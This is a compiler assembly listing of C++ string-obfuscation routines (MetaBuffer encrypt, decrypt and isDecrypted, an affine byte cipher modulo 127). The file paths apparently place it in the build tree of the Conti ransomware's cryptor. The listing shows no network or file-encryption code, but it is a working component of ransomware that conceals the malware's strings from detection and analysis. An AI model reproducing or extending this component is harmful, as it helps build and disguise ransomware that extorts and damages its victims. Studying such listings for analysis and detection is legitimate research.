;	COMDAT ?encrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 11	 imul	 r8d, eax, 17
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5b	 add	 r8d, 91			; 0000005bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BB@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<17,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 60	 sub	 eax, 96			; 00000060H
  00006	44 6b c0 22	 imul	 r8d, eax, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 47	 imul	 r8d, eax, 71		; 00000047H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 60	 add	 r8d, 96			; 00000060H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 03 00 00 00	 mov	 ecx, 3
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 03
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+3]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 16 00 00 00	 mov	 ecx, 22
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 07	 imul	 r8d, eax, 7
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 16	 add	 r8d, 22
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 6f 00 00 00	 mov	 ecx, 111		; 0000006fH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0b	 imul	 r8d, eax, 11
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6f	 add	 r8d, 111		; 0000006fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 66	 sub	 eax, 102		; 00000066H
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 66	 add	 r8d, 102		; 00000066H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
